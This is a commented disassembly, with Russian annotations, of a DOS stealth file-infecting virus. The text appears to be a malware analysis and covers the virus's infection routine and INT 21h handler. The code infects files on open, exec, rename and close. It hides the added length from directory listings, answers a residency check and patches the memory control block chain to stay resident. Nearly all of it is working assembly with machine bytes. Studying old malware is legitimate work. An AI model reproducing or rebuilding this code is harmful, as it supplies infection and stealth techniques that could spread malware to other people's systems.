 0C12  55		push	bp
 0C13  1E		push	ds
 0C14  06		push	es
 0C15  E8 FE9A		call	TakeINT24	    ; (0AB2)
 0C18  B8 4300		mov	ax,4300h            ; получить аттрибуты файла
 0C1B  E8 FCD4		call	Int21Call	    ; (08F2)
 0C1E  2E: 89 0E 0C4C	mov	word ptr cs:[0C4Ch],cx	; сохраним их
 0C23  B8 4301		mov	ax,4301h            ; обнулить аттрибуты
 0C26  33 C9		xor	cx,cx		    
 0C28  E8 FCC7		call	Int21Call	    ; (08F2)
 0C2B  72 24		jc	loc_124		
 0C2D  B8 3D02		mov	ax,3D02h  	    ; открыть для чтения/записи
 0C30  E8 FCBF		call	Int21Call	    ; (08F2)
 0C33  72 13		jc	loc_123		
 0C35  52		push	dx
 0C36  1E		push	ds
 0C37  0E		push	cs
 0C38  1F		pop	ds
 0C39  0E		push	cs
 0C3A  07		pop	es
 0C3B  A3 0F39		mov	ds:0F39h,ax	; хендл в процедуру обращения 
						; к файлу
0C3E  E8 FCB9		call	sub_25	        ; обработать файл  (08FA)
0C41  B4 3E		mov	ah,3Eh		;
0C43  E8 FCA7		call	Int21Call_BX	; Закрыть файл
0C46  1F		pop	ds
0C47  5A		pop	dx
0C48		loc_123:			; /xref 0C33/
0C48  B8 4301		mov	ax,4301h        ; установить прежние аттрибуты
0C4B  B9 0020		mov	cx,^^^^		; /xref 0C1E/
0C4E  E8 FCA1		call	Int21Call
0C51		loc_124:			; xref 0C2B
0C51  E8 FE7C		call	Int24Back	; (0AD0)
0C54  07		pop	es
0C55  1F		pop	ds
0C56  5D		pop	bp
0C57  5F		pop	di
0C58  5E		pop	si
0C59  59		pop	cx
0C5A  5B		pop	bx
0C5B  58		pop	ax
0C5C  C3		retn
		MainInfect	endp

		███████ INT 21 HANDLER ENTRY POINT ██████

0C5D  9C		pushf
0C5E  FB		sti
0C5F  80 FC 11		cmp	ah,11h		;проверка номера функции
0C62  74 05		je	FCBFind
0C64  80 FC 12		cmp	ah,12h
0C67  75 2F		jne	loc_128

▄▄▄ FCB FINDFIRST/FINDNEXT ▄▄▄			;Скрывает приращение длины

0C69		FCBFind:			;/xref 0C62/
0C69  EB 00		jmp	short $+2	;стрелка: Oткрывается при 
      XX XX		jmp     short IRET11	;завершении процесса (f.4Ch)
					       ;Закрывается при запуске CHKDSK
					         (xref 0B78)
0C6B  53		push	bx
0C6C  06		push	es
0C6D  50		push	ax
0C6E  B4 2F		mov	ah,2Fh		
0C70  E8 FC7F		call	Int21Call       ;Получить текущее DTA в ES:BX
0C73  58		pop	ax
0C74  E8 FC7B		call	Int21Call       ;Выполнить f.11/12
0C77  3C FF		cmp	al,0FFh
0C79  74 19		je	IRET11          ;ошибка поиска
0C7B  50		push	ax
0C7C  26: 80 3F FF	cmp	byte ptr es:[bx],0FFh  ; расширенный MCB ?
0C80  75 03  		jne	loc_126	      
0C82  83 C3 07		add	bx,7          
0C85		loc_126:
0C85  83 C3 17		add	bx,17h        ; секунды файла
0C88  E8 FF4A		call	TimeTest      ; (0BD5) проверить на заражен-
					      ;	ность
0C8B  58		pop	ax	      
0C8C  73 06		jnc	Iret11	      ; CF=1 если признак "заражено"
0C8E  83 C3 06	  	add	bx,6	      
0C91  E8 FF62		call	HideSize      ; (0BF6) скрыть истинную длину
0C94		IRET11:		     	      ; выход из обработчика
0C94  07		pop	es
0C95  5B		pop	bx
0C96  9D		popf		      
0C97  CF		iret		     

0C98		loc_128:		      ;  /xref 0C67/
0C98  80 FC 4E		cmp	ah,4Eh	      
0C9B  74 05		je	Find4E	     
0C9D  80 FC 4F		cmp	ah,4Fh	
0CA0  75 2C		jne	loc_132	

▄▄▄ FINDFIRST/FINDNEXT ▄▄▄

0CA2		Find4E:		      	      ;  /xref 0C9B/
0CA2  53		push	bx
0CA3  06		push	es
0CA4  50		push	ax
0CA5  B4 2F		mov	ah,2Fh	      ; получить DTA в ES:BX
0CA7  E8 FC48		call	Int21Call     ; (08F2)
0CAA  58		pop	ax
0CAB  E8 FC44		call	Int21Call     ; (08F2) Выполнить Поиск
0CAE  72 17		jc	Find4eErrExit ; ошибка поиска
0CB0  50		push	ax
0CB1  83 C3 16		add	bx,16h		
0CB4  E8 FF1E		call	TimeTest      ; (0BD5)
0CB7  58		pop	ax
0CB8  73 06		jnс     Exit4EOk 
0CBA  83 C3 04		add	bx,4
0CBD  E8 FF36		call	HideSize      ; (0BF6) скрыть длину
0CC0		Exit4eOK:		      ; /xref 0CB8/ нормальный выход
0CC0  07		pop	es
0CC1  5B		pop	bx
0CC2  9D		popf			
0CC3  F8		clc			
0CC4  CA 0002		retf	2		
0CC7		Find4EErrExit:		      ; выход по ошибке поиска
0CC7  07		pop	es
0CC8  5B		pop	bx
0CC9  9D		popf			
0CCA  F9		stc			
0CCB  CA 0002		retf	2		
0CCE		loc_132:		      ;  /xref 0CA0/
0CCE  3D 4B53		cmp	ax,4B53h      ; запрос о наличии в памяти?
0CD1  75 05		jne	loc_133

▄▄▄ ЗАПРОС О HАЛИЧИИ В ПАМЯТИ ▄▄▄

0CD3  B8 454B		mov	ax,454Bh      ; вирус уже есть в памяти  	
0CD6  9D		popf		
0CD7  CF		iret		

0CD8		loc_133:		      ;  /xref 0CD1/
0CD8  80 FC 4C		cmp	ah,4Ch			
0CDB  75 06		jne	loc_134			

▄▄▄ TERMINATE ▄▄▄

0CDD  2E:C606 0C6A 00	mov	byte ptr cs:[0C6Ah],0	;открыть ветку скрытия
					      ;длины

0CE3		loc_134:		      ; дальше...
0CE3  FC		cld			
0CE4  52		push	dx
0CE5  3D 4B00		cmp	ax,4B00h
0CE8  75 3D		jne	loc_138	

▄▄▄ EXEC00 ▄▄▄

0CEA  EB 39		jmp	short loc_137 ; стрелка (0D25)
0CEB  ^^		jmp 0CECh	      ; (0D1B) Закрывается
					      ; после выполнения 
0CEC			push    ax
			push    bx
			push    ds
			push    es

			; Поиск последнего блока памяти сканированием цепочки 
			; блоков: 

			mov     ah,52h	      ; список списков
			call    Int21Call
			mov     ax,es:[bx-2]  ; первый MCB
						
0CF9		ScanZBlock:		      ; Ищем последний блок памяти
0CF9  8E D8		mov	ds,ax
0CFB  03 06 0003	add	ax,ds:0003    ; размер блока
0CFF  40		inc	ax            
0D00  80 3E 0000 5A	cmp	byte ptr ds:0000,'Z'
0D05  75 F2		jne	ScanZBlock

0D07  8C CB		mov	bx,cs
0D09  3B C3		cmp	ax,bx		; Там мы ?
0D0B  75 0E		jne	LastNotOurs	

				; замена "несуществующей памяти" на
				; блок, принадлежащий самому себе
			
0D0D  C6 06 0000 4D	mov	byte ptr ds:0000,4Dh	; не последний блок
0D12  33 C0	      	xor	ax,ax		
0D14  8E D8		mov	ds,ax
0D16  83 06 0413 04	add	word ptr ds:main_ram_size_,4
				; подавитесь своими 4мя килограммами мозгов!
0D1B		LastNotOurs:				;  /xref 0D0B/
0D1B  2E: C6 06 0CEB 39	mov	byte ptr cs:[0CEBh],39h	; заткнем эту п-у
0D21  07		pop	es ds bx ax

0D25		loc_137:				; /xref 0CEA/
0D25  EB 54		jmp	short PreInfect		; дальше как обычно

0D27			loc_138:			; /xref 0CE8/
0D27  80 FC 3D			cmp	ah,3Dh		; '='
0D2A  74 4F			je	PreInfect       ; обработка открытия
							; файла
0D2C  80 FC 56			cmp	ah,56h
0D2F  74 4A			je	PreInfect      	; обработка RenameMove
0D31  3D 6C00			cmp	ax,6C00h
0D34  75 09			jne	loc_139	      

▄▄▄ EXTENDED_FOPEN_FCREATE ▄▄▄

0D36  F6 C2 12		test	dl,12h	; 00010010B
			;	    создать->^  ^<-открыть/заменить
0D39  8B D6		mov	dx,si  		    ; имя в DS:SI
0D3B  74 3E		jz	PreInfect   	    ; обычная обработка
0D3D  EB 46		jmp	short loc_143	    ; (0D85)

0D3F		loc_139:			    ;  /xref 0D34/
0D3F  80 FC 3C		cmp	ah,3Ch		 
0D42  74 41		je	loc_143			 
0D44  80 FC 5B		cmp	ah,5Bh			
0D47  74 3C		je	loc_143			
0D49  80 FC 3E		cmp	ah,3Eh			
0D4C  75 26		jne	ExitToDOS			

 0D4E  2E: 3B 1E 0F67	cmp	bx,cs:0F67h	    ; 
 0D53  75 1F		jne	ExitToDOS			
 0D55  0B DB		or	bx,bx		    
 0D57  74 1B		jz	ExitToDOS	    ; [0F67h]=0000
 0D59  E8 FB96		call	Int21Call	    ; (08F2)
 0D5C  72 43		jc	loc_144			
 0D5E  1E		push	ds
 0D5F  0E		push	cs
 0D60  1F		pop	ds
 0D61  BA 0F69		mov	dx,0F69h
 0D64  E8 FEA6		call	MainInfect 	    ; (0C0D) обработать файл
 0D67  C7 06 0F67 0000	mov	word ptr ds:0F67,0  
 0D6D  1F		pop	ds
 0D6E		loc_140:			;  /xref 0DBC/
 0D6E ·5A		pop	dx
 0D6F  9D		popf			
 0D70  F8		clc			
 0D71  CA 0002		retf	2		; Return far- Далеко вернуться
 0D74		ExitToDOS:			; /xref 0D4C, 0D53, 0D57, 0D7E
						;        0D83, 0D8B, 0D90 /
						; вызов оригинального DOSа
 0D74 ·5A		pop	dx
 0D75  9D		popf		
 0D76  2E: FF 2E 0DE8	jmp	dword ptr cs:0DE8h

▄▄▄ FOPEN REN_MOVE EXT_FOPEN(cont'd) EXEC00(cont'd) ▄▄▄

0D7B		   PreInfect:			;  /xref 0D25,0D2A,0D2F,0D3B/
0D7B  E8 FD98		call	TestFile	; (0B16)
0D7E  72 F4		jc	ExitToDOS	; нельзя заражать
0D80  E8 FE8A		call	MainInfect	; (0C0D) заразить файл
0D83  EB EF		jmp	short ExitToDOS	; (0D74)
0D85		   loc_143:			; /xref 525D:0D3D, 0D42, 0D47/
0D85  2E: 83 3E 0F67 00	cmp     word ptr cs:0F67H,0
0D8B  75 E7		jne	ExitToDOS			
0D8D  E8 FD86		call	TestFile	; (0B16)
0D90  72 E2		jc	ExitToDOS			
0D92  2E: 89 16 0D9D	mov	word ptr cs:[0D9Dh],dx	
0D97  5A		pop	dx
0D98  52		push	dx
0D99  E8 FB56		call	Int21Call	; (08F2)
0D9C  BA 0C32		mov	dx,0C32h
0D9F  73 06		jnc	loc_145		
0DA1		  loc_144:			;  xref 0D5C
0DA1  5A		pop	dx
0DA2  9D		popf			
0DA3  F9		stc			
0DA4  CA 0002		retf	2	
0DA7		loc_145:			; /xref 0D9F/
0DA7  51		push	cx
0DA8  56		push	si
0DA9  57		push	di
0DAA  06		push	es
0DAB  87 F2		xchg	si,dx          ; копируем в буффер имя открыва-
					       ; емого файла
0DAD ·BF 0F67		mov	di,0F67h 
0DB0  0E		push	cs
0DB1  07		pop	es
0DB2  AB		stosw		       ; запоминаем хендл 
0DB3  B9 004B		mov	cx,4Bh	       ; и 75 символов	
0DB6  F3/ A4		rep	movsb			
					       ; при закрытии файл открывается
					       ; заново на основании этой инфЫ
0DB8  07		pop	es
0DB9  5F		pop	di
0DBA  5E		pop	si
0DBB  59		pop	cx
0DBC  EB B0		jmp	short loc_140		; (0D6E)

0DBE  44 69 64 20 79 6F			db	'Did you leave the room ?'
0DC4  75 20 6C 65 61 76
0DCA  65 20 74 68 65 20
0DD0  72 6F 6F 6D 20 3F
0DD6  EA 04				db	0EAh, 04h
			seg_a		ends
			end	start
0DD8

      Область данных вне вируса
      --------------------------

0F39  dw  ?        ; хендл обрабатываемого файла 
0F3B  db  ? dup(?) ; буффер для формирования пятен
0F45  db	   ; /xref0946/  буффер для чтения заголовка файла

0F5F  dw  ?	   ; Адрес INT 24h		/xref 0ABC/
0F61  dw  ?        ; 

0F63  dw  ?        ; Время и дата файла
0F65  dw  ? 	   ; ------""-------
0F67  dw  ?	   ; /xref 0D4E,0D67,0D85,0DAD/  хендл файла
0F69  dw  ?        ; /xref 0D61/  имя файла, который необходимо заразить
		   ; после закрытия (75 байт)
